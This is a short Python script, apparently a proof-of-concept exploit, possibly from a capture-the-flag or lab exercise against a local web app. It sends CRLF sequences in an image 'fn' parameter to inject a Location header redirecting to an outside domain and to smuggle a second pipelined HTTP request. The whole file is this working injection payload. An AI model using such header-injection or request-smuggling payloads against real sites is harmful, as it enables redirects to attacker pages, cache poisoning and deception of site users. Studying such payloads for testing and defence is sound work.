import requests


def main():
    host = "http://localhost:5000"
    url = host + "/api/image?fn=/ HTTP/1.1\r\nLocation: http://navy356.biz/\r\nConnection: keep-alive\r\n\r\nGET /logo.png HTTP/1.1\r\nHost: localhost:5000\r\n\r\n"
    r = requests.get(url)
    print(r.text)


main()